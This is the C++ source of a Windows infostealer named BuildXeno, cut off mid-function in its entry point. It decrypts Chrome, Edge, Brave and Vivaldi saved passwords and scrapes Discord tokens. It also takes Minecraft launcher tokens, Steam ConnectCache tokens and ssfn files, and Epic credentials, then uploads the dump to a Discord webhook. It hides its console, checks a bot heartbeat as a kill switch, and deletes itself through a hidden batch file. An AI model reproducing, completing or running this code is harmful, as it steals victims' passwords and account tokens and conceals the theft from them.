// BuildXeno.cpp — Windows x64, C++17.
// Links: winhttp.lib bcrypt.lib crypt32.lib advapi32.lib
//
// Collects Chromium-family saved logins (Chrome/Edge/Brave/Vivaldi),
// Discord tokens (stable/canary/ptb/Lightcord), Minecraft launcher tokens,
// Steam account names + ConnectCache tokens, Epic account id + installed apps.
// Posts one multipart upload to the configured Discord webhook.

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <wincred.h>
#include <shlobj.h>

#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <ctime>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <tuple>
#include <vector>

#ifdef _MSC_VER
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#endif

namespace fs = std::filesystem;

// XenoBot writes this header when ".l #channel" binds.
// build.bat adds /I ..\XenoBot so the generated file is found.
#if defined(__has_include)
#  if __has_include("xeno_target.h")
#    include "xeno_target.h"
#  endif
#endif

#ifndef XENO_WEBHOOK
#define XENO_WEBHOOK L"https://discord.com/api/webhooks/REPLACE_WITH_ID/REPLACE_WITH_TOKEN"
#endif
#ifndef XENO_TOKEN
#define XENO_TOKEN L"REPLACE_BOT_TOKEN"
#endif
#ifndef XENO_CHANNEL
#define XENO_CHANNEL L"REPLACE_CHANNEL_ID"
#endif

static const wchar_t* WEBHOOK_URL = XENO_WEBHOOK;
static const wchar_t* BOT_TOKEN   = XENO_TOKEN;
static const wchar_t* BOT_CHANNEL = XENO_CHANNEL;

// Heartbeat older than this many seconds counts as "bot offline".
static const long long ALIVE_WINDOW_SEC = 180;

// ------------------------------------------------------------------ utils

static std::string narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(),
                                nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), s.data(), n,
                        nullptr, nullptr);
    return s;
}

static std::string json_escape(const std::string& in) {
    std::string out;
    out.reserve(in.size() + 16);
    for (unsigned char c : in) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += (char)c;
                }
        }
    }
    return out;
}

static std::wstring env(const wchar_t* name) {
    DWORD n = GetEnvironmentVariableW(name, nullptr, 0);
    if (!n) return {};
    std::wstring v(n, 0);
    GetEnvironmentVariableW(name, v.data(), n);
    v.resize(n - 1);
    return v;
}

static std::string read_file(const fs::path& p, size_t cap = 64u * 1024 * 1024) {
    std::error_code ec;
    if (!fs::exists(p, ec) || !fs::is_regular_file(p, ec)) return {};
    std::ifstream f(p, std::ios::binary);
    if (!f) return {};
    std::string s((std::istreambuf_iterator<char>(f)),
                  std::istreambuf_iterator<char>());
    if (s.size() > cap) s.resize(cap);
    return s;
}
// ------------------------------------------------------------------ crypto

static std::vector<BYTE> dpapi_unwrap(const BYTE* data, DWORD len) {
    DATA_BLOB in{len, const_cast<BYTE*>(data)};
    DATA_BLOB out{};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return {};
    std::vector<BYTE> v(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return v;
}

// Chromium v10: AES-256-GCM, blob = "v10" || 12-byte nonce || ciphertext || 16-byte tag.
static std::string aes_gcm_decrypt(const std::vector<BYTE>& key,
                                   const std::string& blob) {
    if (blob.size() < 3 + 12 + 16) return {};
    const BYTE* nonce = (const BYTE*)blob.data() + 3;
    const BYTE* ct = (const BYTE*)blob.data() + 15;
    const ULONG ct_len = (ULONG)(blob.size() - 15);  // includes tag

    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_KEY_HANDLE kh = nullptr;
    std::string result;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        return {};
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return {};
    }
    if (BCryptGenerateSymmetricKey(alg, &kh, nullptr, 0, (PUCHAR)key.data(),
                                   (ULONG)key.size(), 0) != 0) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return {};
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info{};
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = 12;
    info.pbTag = (PUCHAR)(ct + ct_len - 16);
    info.cbTag = 16;

    std::vector<BYTE> plain(ct_len);
    ULONG done = 0;
    NTSTATUS st = BCryptDecrypt(kh, (PUCHAR)ct, ct_len - 16, &info, nullptr, 0,
                                plain.data(), (ULONG)plain.size(), &done, 0);
    if (st == 0) result.assign((char*)plain.data(), done);

    BCryptDestroyKey(kh);
    BCryptCloseAlgorithmProvider(alg, 0);
    return result;
}

static std::vector<BYTE> base64_decode(const std::string& b64) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64,
                              nullptr, &out_len, nullptr, nullptr))
        return {};
    std::vector<BYTE> raw(out_len);
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(), CRYPT_STRING_BASE64,
                              raw.data(), &out_len, nullptr, nullptr))
        return {};
    raw.resize(out_len);
    return raw;
}

// Local State -> os_crypt.encrypted_key -> strip "DPAPI" -> CryptUnprotectData.
static std::vector<BYTE> chromium_master_key(const fs::path& user_data) {
    std::string ls = read_file(user_data / L"Local State");
    if (ls.empty()) return {};

    size_t k = ls.find("\"encrypted_key\"");
    if (k == std::string::npos) return {};
    size_t c = ls.find(':', k);
    if (c == std::string::npos) return {};
    size_t q1 = ls.find('"', c);
    if (q1 == std::string::npos) return {};
    size_t q2 = ls.find('"', q1 + 1);
    if (q2 == std::string::npos) return {};

    std::vector<BYTE> raw = base64_decode(ls.substr(q1 + 1, q2 - q1 - 1));
    if (raw.size() < 5 || memcmp(raw.data(), "DPAPI", 5) != 0) return {};
    return dpapi_unwrap(raw.data() + 5, (DWORD)(raw.size() - 5));
}

// ------------------------------------------------------------------ sqlite

namespace sqlite {

static uint64_t be16(const uint8_t* p) {
    return ((uint64_t)p[0] << 8) | p[1];
}
static uint64_t be32(const uint8_t* p) {
    return ((uint64_t)p[0] << 24) | ((uint64_t)p[1] << 16) |
           ((uint64_t)p[2] << 8) | p[3];
}
static uint64_t varint(const uint8_t*& p, const uint8_t* end) {
    uint64_t v = 0;
    for (int i = 0; i < 9 && p < end; ++i) {
        uint8_t b = *p++;
        if (i == 8) {
            v = (v << 8) | b;
            break;
        }
        v = (v << 7) | (b & 0x7f);
        if (!(b & 0x80)) break;
    }
    return v;
}

struct Reader {
    std::string db;
    uint32_t page_size = 4096;
    uint32_t usable = 4096;

    bool open(const fs::path& p) {
        db = read_file(p);
        if (db.size() < 512) return false;
        if (memcmp(db.data(), "SQLite format 3\0", 16) != 0) return false;
        const uint8_t* h = (const uint8_t*)db.data();
        uint32_t ps = (uint32_t)be16(h + 16);
        page_size = (ps == 1) ? 65536u : ps;
        if (page_size < 512 || page_size > 65536) return false;
        usable = page_size - h[20];
        return true;
    }

    // Decode one record payload into columns.
    static std::vector<std::string> decode(const std::vector<uint8_t>& payload) {
        std::vector<std::string> out;
        if (payload.size() < 2) return out;
        const uint8_t* p = payload.data();
        const uint8_t* end = p + payload.size();
        uint64_t hdr_len = varint(p, end);
        const uint8_t* hdr_end = payload.data() + std::min<uint64_t>(hdr_len, payload.size());
        std::vector<uint64_t> types;
        while (p < hdr_end && types.size() < 64) types.push_back(varint(p, end));

        const uint8_t* body = hdr_end;
        static const size_t fixed[] = {0, 1, 2, 3, 4, 6, 8, 8, 0, 0};
        for (uint64_t t : types) {
            size_t sz = 0;
            bool text = false;
            if (t >= 12) {
                sz = (size_t)((t & 1) ? (t - 13) / 2 : (t - 12) / 2);
                text = (t & 1) != 0;
            } else if (t < 10) {
                sz = fixed[t];
            }
            if (body + sz > end) {
                out.emplace_back();
                body = end;
                continue;
            }
            if (text) {
                out.emplace_back((const char*)body, sz);
            } else if (t == 8) {
                out.emplace_back("0");
            } else if (t == 9) {
                out.emplace_back("1");
            } else if (t == 0 || t >= 10) {
                out.emplace_back();
            } else {
                uint64_t v = 0;
                for (size_t i = 0; i < sz; ++i) v = (v << 8) | body[i];
                out.push_back(std::to_string(v));
            }
            body += sz;
        }
        return out;
    }

    std::vector<std::string> read_cell(const uint8_t* cell, uint64_t payload_len) {
        // local payload size for table leaf pages
        uint64_t local = usable - 35;
        if (payload_len <= local) {
            return decode(std::vector<uint8_t>(cell, cell + payload_len));
        }
        // overflow chain
        std::vector<uint8_t> buf(cell, cell + local);
        uint32_t next = (uint32_t)be32(cell + local);
        while (buf.size() < payload_len && next) {
            size_t off = (size_t)(next - 1) * page_size;
            if (off + 4 > db.size()) break;
            next = (uint32_t)be32((const uint8_t*)db.data() + off);
            size_t chunk = std::min<size_t>(usable - 4, payload_len - buf.size());
            if (off + 4 + chunk > db.size()) chunk = db.size() - off - 4;
            buf.insert(buf.end(), db.begin() + off + 4, db.begin() + off + 4 + chunk);
        }
        return decode(buf);
    }

    void walk(uint32_t page, std::vector<std::vector<std::string>>& rows,
              size_t max_rows) {
        if (!page || rows.size() >= max_rows) return;
        size_t base = (size_t)(page - 1) * page_size;
        if (base + 8 > db.size()) return;

        const uint8_t* pg = (const uint8_t*)db.data() + base;
        size_t hdr = (page == 1) ? 100 : 0;
        if (base + hdr + 8 > db.size()) return;

        uint8_t type = pg[hdr];
        uint64_t ncell = be16(pg + hdr + 3);

        if (type == 5) {  // interior table
            size_t ptr = hdr + 12;
            for (uint64_t i = 0; i < ncell; ++i) {
                if (ptr + 2 > page_size) break;
                uint32_t child = (uint32_t)be32(pg + ptr + 2 * i);
                walk(child, rows, max_rows);
            }
            walk((uint32_t)be32(pg + hdr + 8), rows, max_rows);
        } else if (type == 13) {  // leaf table
            size_t ptr = hdr + 8;
            for (uint64_t i = 0; i < ncell; ++i) {
                if (ptr + 2 > page_size) break;
                uint32_t off = (uint32_t)be16(pg + ptr + 2 * i);
                if (off >= page_size) continue;
                const uint8_t* cell = pg + off;
                const uint8_t* end = pg + page_size;
                uint64_t payload_len = varint(cell, end);
                (void)varint(cell, end);  // rowid
                rows.push_back(read_cell(cell, payload_len));
                if (rows.size() >= max_rows) return;
            }
        }
    }

    std::vector<std::vector<std::string>> table(const std::string& name) {
        std::vector<std::vector<std::string>> master;
        walk(1, master, 1000);
        uint32_t root = 0;
        for (auto& r : master) {
            // sqlite_master: type, name, tbl_name, rootpage, sql
            if (r.size() >= 4 && r[0] == "table" && r[1] == name) {
                root = (uint32_t)std::strtoul(r[3].c_str(), nullptr, 10);
                break;
            }
        }
        if (!root) return {};
        std::vector<std::vector<std::string>> rows;
        walk(root, rows, 5000);
        return rows;
    }
};

}  // namespace sqlite

// ------------------------------------------------------------------ chrome

struct Entry {
    std::string origin, username, secret, note;
};

static void collect_chromium_logins(const fs::path& profile,
                                    const std::vector<BYTE>& key,
                                    std::vector<Entry>& out) {
    sqlite::Reader r;
    if (!r.open(profile / L"Login Data")) return;
    auto rows = r.table("logins");
    for (auto& row : rows) {
        // origin_url, action_url, username_element, username_value,
        // password_element, password_value, ...
        if (row.size() < 6) continue;
        const std::string& user = row[3];
        std::string blob = row[5];
        if (user.empty() || blob.empty()) continue;

        std::string plain;
        if (blob.rfind("v10", 0) == 0 || blob.rfind("v20", 0) == 0) {
            plain = aes_gcm_decrypt(key, blob);
            if (plain.empty()) {
                // v20 app-bound keys cannot be unwrapped with DPAPI alone.
                plain = "<v20 app-bound: not decryptable offline>";
            }
        } else {
            plain = blob;  // pre-v10 plaintext
        }
        Entry e;
        e.origin = row[0];
        e.username = user;
        e.secret = plain;
        e.note = "browser_login";
        out.push_back(std::move(e));
    }
}

// Discord tokens are plaintext inside Local Storage leveldb files.
static void collect_leveldb_tokens(const fs::path& dir, const std::string& label,
                                   std::vector<Entry>& out) {
    std::error_code ec;
    if (!fs::exists(dir, ec)) return;
    for (auto& f : fs::directory_iterator(dir, ec)) {
        if (ec) break;
        if (!f.is_regular_file()) continue;
        std::string name = narrow(f.path().filename().wstring());
        if (name.size() < 3) continue;
        std::string ext = name.substr(name.size() - 3);
        if (ext != "ldb" && ext != "log") continue;

        std::string data = read_file(f.path(), 32u * 1024 * 1024);
        if (data.empty()) continue;

        // Token shape: base64ish . base64ish . base64ish
        for (size_t i = 0; i + 60 < data.size(); ++i) {
            size_t j = i;
            auto part = [&](size_t min_len, size_t max_len) -> bool {
                size_t start = j;
                while (j < data.size()) {
                    char c = data[j];
                    bool ok = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                              (c >= '0' && c <= '9') || c == '_' || c == '-';
                    if (!ok) break;
                    ++j;
                }
                size_t len = j - start;
                return len >= min_len && len <= max_len;
            };
            if (!part(20, 30)) { continue; }
            if (j >= data.size() || data[j] != '.') continue;
            ++j;
            if (!part(5, 8)) continue;
            if (j >= data.size() || data[j] != '.') continue;
            ++j;
            if (!part(25, 45)) continue;

            std::string tok = data.substr(i, j - i);
            Entry e;
            e.origin = label;
            e.note = "discord_token";
            e.secret = tok;
            out.push_back(std::move(e));
            i = j;
        }
    }
}

// ------------------------------------------------------------------ games

static void collect_minecraft(std::vector<Entry>& out) {
    std::wstring appdata = env(L"APPDATA");
    if (appdata.empty()) return;
    fs::path p = fs::path(appdata) / L".minecraft" / L"launcher_accounts.json";
    std::string s = read_file(p);
    if (s.empty()) return;

    // Pull "accessToken" and the nearest preceding "name" / "remoteId".
    size_t pos = 0;
    while ((pos = s.find("\"accessToken\"", pos)) != std::string::npos) {
        size_t c = s.find(':', pos);
        size_t q1 = s.find('"', c);
        size_t q2 = s.find('"', q1 + 1);
        if (q1 == std::string::npos || q2 == std::string::npos) break;

        Entry e;
        e.note = "minecraft";
        e.secret = s.substr(q1 + 1, q2 - q1 - 1);

        size_t nm = s.rfind("\"name\"", pos);
        if (nm != std::string::npos) {
            size_t n1 = s.find('"', s.find(':', nm));
            size_t n2 = s.find('"', n1 + 1);
            if (n1 != std::string::npos && n2 != std::string::npos)
                e.username = s.substr(n1 + 1, n2 - n1 - 1);
        }
        size_t rid = s.rfind("\"remoteId\"", pos);
        if (rid != std::string::npos) {
            size_t r1 = s.find('"', s.find(':', rid));
            size_t r2 = s.find('"', r1 + 1);
            if (r1 != std::string::npos && r2 != std::string::npos)
                e.origin = s.substr(r1 + 1, r2 - r1 - 1);
        }
        if (!e.secret.empty()) out.push_back(std::move(e));
        pos = q2;
    }
}

static std::string vdf_value(const std::string& blob, const std::string& key,
                             size_t from = 0) {
    size_t k = blob.find("\"" + key + "\"", from);
    if (k == std::string::npos) return {};
    size_t q1 = blob.find('"', blob.find('"', k + key.size() + 2) + 1);
    if (q1 == std::string::npos) return {};
    size_t q2 = blob.find('"', q1 + 1);
    if (q2 == std::string::npos) return {};
    return blob.substr(q1 + 1, q2 - q1 - 1);
}

static void collect_steam(std::vector<Entry>& out) {
    std::vector<fs::path> roots;
    std::wstring p86 = env(L"ProgramFiles(x86)");
    std::wstring pf = env(L"ProgramFiles");
    if (!p86.empty()) roots.push_back(fs::path(p86) / L"Steam");
    if (!pf.empty()) roots.push_back(fs::path(pf) / L"Steam");

    for (auto& root : roots) {
        std::error_code ec;
        fs::path cfg = root / L"config";
        if (!fs::exists(cfg, ec)) continue;

        std::string lu = read_file(cfg / L"loginusers.vdf");
        std::string cv = read_file(cfg / L"config.vdf");

        size_t pos = 0;
        while ((pos = lu.find("\"AccountName\"", pos)) != std::string::npos) {
            size_t q1 = lu.find('"', lu.find('"', lu.find('"', pos) + 1) + 1);
            if (q1 == std::string::npos) break;
            size_t q2 = lu.find('"', q1 + 1);
            if (q2 == std::string::npos) break;

            Entry e;
            e.note = "steam";
            e.username = lu.substr(q1 + 1, q2 - q1 - 1);
            e.origin = root.string();
            e.secret = vdf_value(cv, "ConnectCache", 0);  // populated below
            out.push_back(std::move(e));
            pos = q2;
        }

        // ConnectCache holds per-account auth tokens.
        size_t cc = cv.find("\"ConnectCache\"");
        if (cc != std::string::npos) {
            size_t open = cv.find('{', cc);
            size_t close = cv.find('}', open);
            if (open != std::string::npos && close != std::string::npos) {
                std::string block = cv.substr(open, close - open);
                size_t p = 0;
                while ((p = block.find('"', p)) != std::string::npos) {
                    size_t k1 = p;
                    size_t k2 = block.find('"', k1 + 1);
                    if (k2 == std::string::npos) break;
                    size_t v1 = block.find('"', k2 + 1);
                    size_t v2 = block.find('"', v1 + 1);
                    if (v1 == std::string::npos || v2 == std::string::npos) break;
                    Entry e;
                    e.note = "steam_connectcache";
                    e.username = block.substr(k1 + 1, k2 - k1 - 1);
                    e.secret = block.substr(v1 + 1, v2 - v1 - 1);
                    out.push_back(std::move(e));
                    p = v2 + 1;
                }
            }
        }

        // ssfn* machine auth blobs
        for (auto& f : fs::directory_iterator(cfg, ec)) {
            if (ec) break;
            std::string n = narrow(f.path().filename().wstring());
            if (n.rfind("ssfn", 0) != 0) continue;
            Entry e;
            e.note = "steam_ssfn";
            e.origin = n;
            e.secret = read_file(f.path(), 4096);
            out.push_back(std::move(e));
        }
        break;
    }
}

static void collect_epic(std::vector<Entry>& out) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Epic Games\\Unreal Engine\\Identifiers", 0,
                      KEY_READ, &hk) == ERROR_SUCCESS) {
        wchar_t buf[512];
        DWORD sz = sizeof(buf);
        DWORD type = 0;
        if (RegQueryValueExW(hk, L"AccountId", nullptr, &type, (LPBYTE)buf,
                             &sz) == ERROR_SUCCESS) {
            Entry e;
            e.note = "epic_accountid";
            e.username = narrow(std::wstring(buf, sz / sizeof(wchar_t)));
            out.push_back(std::move(e));
        }
        RegCloseKey(hk);
    }

    std::wstring pd = env(L"ProgramData");
    if (!pd.empty()) {
        std::string dat = read_file(fs::path(pd) / L"Epic" /
                                    L"UnrealEngineLauncher" /
                                    L"LauncherInstalled.dat");
        if (!dat.empty()) {
            Entry e;
            e.note = "epic_installed";
            e.secret = dat.substr(0, std::min<size_t>(dat.size(), 16000));
            out.push_back(std::move(e));
        }
    }

    // Credential Manager entries the launcher drops on disk.
    DWORD count = 0;
    PCREDENTIALW* creds = nullptr;
    if (CredEnumerateW(nullptr, 0, &count, &creds)) {
        for (DWORD i = 0; i < count; ++i) {
            std::wstring target = creds[i]->TargetName ? creds[i]->TargetName : L"";
            if (target.find(L"Epic") == std::wstring::npos &&
                target.find(L"epic") == std::wstring::npos)
                continue;
            Entry e;
            e.note = "epic_credential";
            e.origin = narrow(target);
            e.username = creds[i]->UserName ? narrow(creds[i]->UserName) : "";
            if (creds[i]->CredentialBlob && creds[i]->CredentialBlobSize) {
                std::string hex;
                const BYTE* b = creds[i]->CredentialBlob;
                for (DWORD k = 0; k < creds[i]->CredentialBlobSize; ++k) {
                    char buf[4];
                    std::snprintf(buf, sizeof(buf), "%02x", b[k]);
                    hex += buf;
                }
                e.secret = hex;
            }
            out.push_back(std::move(e));
        }
        CredFree(creds);
    }
}

// ------------------------------------------------------------------ exfil

static std::string build_payload(const std::vector<Entry>& entries) {
    wchar_t host[256]{};
    DWORD hn = 256;
    GetComputerNameW(host, &hn);
    wchar_t user[256]{};
    DWORD un = 256;
    GetUserNameW(user, &un);

    OSVERSIONINFOW vi{};
    vi.dwOSVersionInfoSize = sizeof(vi);
    using RtlGetVersionFn = LONG(WINAPI*)(OSVERSIONINFOW*);
    if (auto fn = (RtlGetVersionFn)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                                  "RtlGetVersion"))
        fn(&vi);

    std::ostringstream j;
    j << "{\"user\":\"" << json_escape(narrow(user)) << "\","
      << "\"host\":\"" << json_escape(narrow(host)) << "\","
      << "\"os\":\"" << vi.dwMajorVersion << "." << vi.dwMinorVersion << "."
      << vi.dwBuildNumber << "\","
      << "\"ts\":" << (long long)std::time(nullptr) << ",\"entries\":[";
    bool first = true;
    for (auto& e : entries) {
        if (!first) j << ",";
        first = false;
        j << "{\"origin\":\"" << json_escape(e.origin) << "\","
          << "\"user\":\"" << json_escape(e.username) << "\","
          << "\"secret\":\"" << json_escape(e.secret) << "\","
          << "\"note\":\"" << json_escape(e.note) << "\"}";
    }
    j << "]}";
    return j.str();
}

static bool post_multipart(const std::string& dump) {
    const std::string boundary = "----XenoBoundary2f8a1c";
    std::string body;
    body.reserve(dump.size() + 512);
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    body += "Content-Type: application/json\r\n\r\n";
    body += "{\"content\":\"BuildXeno dump\"}\r\n";
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"files[0]\"; "
            "filename=\"xeno_dump.json\"\r\n";
    body += "Content-Type: application/json\r\n\r\n";
    body += dump;
    body += "\r\n--" + boundary + "--\r\n";

    std::wstring full = std::wstring(WEBHOOK_URL) + L"?wait=true";

    URL_COMPONENTS uc{};
    uc.dwStructSize = sizeof(uc);
    uc.dwHostNameLength = (DWORD)-1;
    uc.dwUrlPathLength = (DWORD)-1;
    uc.dwExtraInfoLength = (DWORD)-1;
    if (!WinHttpCrackUrl(full.c_str(), 0, 0, &uc)) return false;

    std::wstring host(uc.lpszHostName, uc.dwHostNameLength);
    std::wstring path(uc.lpszUrlPath, uc.dwUrlPathLength);
    if (uc.lpszExtraInfo && uc.dwExtraInfoLength)
        path += std::wstring(uc.lpszExtraInfo, uc.dwExtraInfoLength);

    HINTERNET s = WinHttpOpen(L"BuildXeno/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    WinHttpSetTimeouts(s, 10000, 10000, 20000, 20000);

    HINTERNET c = WinHttpConnect(s, host.c_str(), uc.nPort, 0);
    if (!c) {
        WinHttpCloseHandle(s);
        return false;
    }
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(), nullptr,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     uc.nScheme == INTERNET_SCHEME_HTTPS
                                         ? WINHTTP_FLAG_SECURE
                                         : 0);
    if (!r) {
        WinHttpCloseHandle(c);
        WinHttpCloseHandle(s);
        return false;
    }

    std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" +
                       std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

    BOOL ok = WinHttpSendRequest(r, hdr.c_str(), (DWORD)-1L, (LPVOID)body.data(),
                                 (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(r, nullptr);

    DWORD status = 0;
    DWORD len = sizeof(status);
    if (ok)
        WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &len,
                            WINHTTP_NO_HEADER_INDEX);

    WinHttpCloseHandle(r);
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);
    return ok && status >= 200 && status < 300;
}

// ------------------------------------------------------------------ liveness

static std::string ansi(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_ACP, 0, w.data(), (int)w.size(), nullptr, 0,
                                nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_ACP, 0, w.data(), (int)w.size(), s.data(), n, nullptr,
                        nullptr);
    return s;
}

static bool https_get(const std::wstring& path, const std::wstring& auth,
                      std::string* out) {
    HINTERNET s = WinHttpOpen(L"BuildXeno/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return false;
    WinHttpSetTimeouts(s, 5000, 5000, 8000, 8000);

    HINTERNET c = WinHttpConnect(s, L"discord.com", 443, 0);
    if (!c) { WinHttpCloseHandle(s); return false; }

    HINTERNET r = WinHttpOpenRequest(c, L"GET", path.c_str(), nullptr,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     WINHTTP_FLAG_SECURE);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return false; }

    std::wstring hdr = L"Authorization: " + auth +
                       L"\r\nUser-Agent: BuildXeno (https://xeno.local, 1.0)\r\n";

    BOOL ok = WinHttpSendRequest(r, hdr.c_str(), (DWORD)-1L, nullptr, 0, 0, 0);
    if (ok) ok = WinHttpReceiveResponse(r, nullptr);

    DWORD code = 0, len = sizeof(code);
    if (ok)
        WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &code, &len,
                            WINHTTP_NO_HEADER_INDEX);

    std::string resp;
    if (ok && code >= 200 && code < 300) {
        DWORD avail = 0;
        while (WinHttpQueryDataAvailable(r, &avail) && avail > 0) {
            std::string buf(avail, 0);
            DWORD got = 0;
            if (!WinHttpReadData(r, buf.data(), avail, &got) || got == 0) break;
            resp.append(buf.data(), got);
            if (resp.size() > 1u * 1024 * 1024) break;
        }
    }

    WinHttpCloseHandle(r);
    WinHttpCloseHandle(c);
    WinHttpCloseHandle(s);

    if (out) *out = resp;
    return ok && code >= 200 && code < 300;
}

// The bot edits one message to "xeno-alive <unix>" every 45s. If that
// timestamp is stale, missing, or unreadable, the bot is down.
static bool bot_alive() {
    std::wstring path = L"/api/v10/channels/" + std::wstring(BOT_CHANNEL) +
                        L"/messages?limit=1";
    std::string resp;
    if (!https_get(path, std::wstring(L"Bot ") + BOT_TOKEN, &resp)) return false;

    size_t k = resp.find("xeno-alive ");
    if (k == std::string::npos) return false;
    k += 11;

    long long ts = 0;
    while (k < resp.size() && resp[k] >= '0' && resp[k] <= '9') {
        ts = ts * 10 + (resp[k] - '0');
        if (ts > 4'000'000'000LL) return false;
        ++k;
    }
    if (ts <= 0) return false;

    long long now = (long long)std::time(nullptr);
    if (ts > now + 60) return false;          // clock skew guard
    return (now - ts) <= ALIVE_WINDOW_SEC;
}

// ------------------------------------------------------------------ self-delete

// A running image cannot unlink itself, so hand the job to a detached cmd
// that retries until the handle drops, then removes its own batch file.
// MoveFileEx also queues a delete for the next boot as a fallback.
static void self_delete() {
    wchar_t self[MAX_PATH]{};
    if (!GetModuleFileNameW(nullptr, self, MAX_PATH)) return;

    MoveFileExW(self, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);

    wchar_t tmp[MAX_PATH]{};
    if (!GetTempPathW(MAX_PATH, tmp)) return;

    std::wstring bat = std::wstring(tmp) + L"xeno_" +
                       std::to_wstring(GetCurrentProcessId()) + L".bat";
    std::string target = ansi(self);

    std::ofstream f(bat.c_str(), std::ios::binary | std::ios::trunc);
    if (!f) return;
    f << "@echo off\r\n"
      << ":retry\r\n"
      << "del /f /q \"" << target << "\" >nul 2>&1\r\n"
      << "if exist \"" << target << "\" (\r\n"
      << "  ping -n 2 127.0.0.1 >nul\r\n"
      << "  goto retry\r\n"
      << ")\r\n"
      << "del /f /q \"%~f0\" >nul 2>&1\r\n";
    f.close();

    std::wstring cmd = L"cmd.exe /c \"" + bat + L"\"";
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ------------------------------------------------------------------ entry

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    // No console, no flash. Everything runs from the GUI subsystem.
    FreeConsole();

    // Kill switch: no live bot, no run, no trace.
    if (!bot_alive()) {
        self_delete();
        return 0;
    }

    std::vector<Entry> all;
    std::wstring lad = env(L"LOCALAPPDATA");
    std::wstring appd = env(L"APPDATA");

    if (!lad.empty()) {
        struct Browser {
            fs::path user_data;
            const char* label;
        };
        std::vector<Browser> browsers = {
            {fs::path(lad) / L"Google" / L"Chrome" / L"User Data", "chrome"},
            {fs::path(lad) / L"Microsoft" / L"Edge" / L"User Data", "edge"},
            {fs::path(lad) / L"BraveSoftware" / L"Brave-Browser" / L"User Data", "brave"},
            {fs::path(lad) / L"Vivaldi" / L"User Data", "vivaldi"},
        };

        for (auto& b : browsers) {
            std::error_code ec;
            if (!fs::exists(b.user_data, ec)) continue;
            auto key = chromium_master_key(b.user_data);
            if (key.empty()) continue;

            for (auto& prof : fs::directory_iterator(b.user_data, ec)) {
                if (ec) break;
                if (!prof.is_directory()) continue;
                std::string pname = narrow(prof.path().filename().wstring());
                if (pname != "Default" && pname.rfind("Profile", 0) != 0) continue;

                collect_chromium_logins(prof.path(), key, all);
                collect_leveldb_tokens(prof.path() / L"Local Storage" / L"leveldb",
                                       b.label, all);
            }
        }
    }

    if (!appd.empty()) {
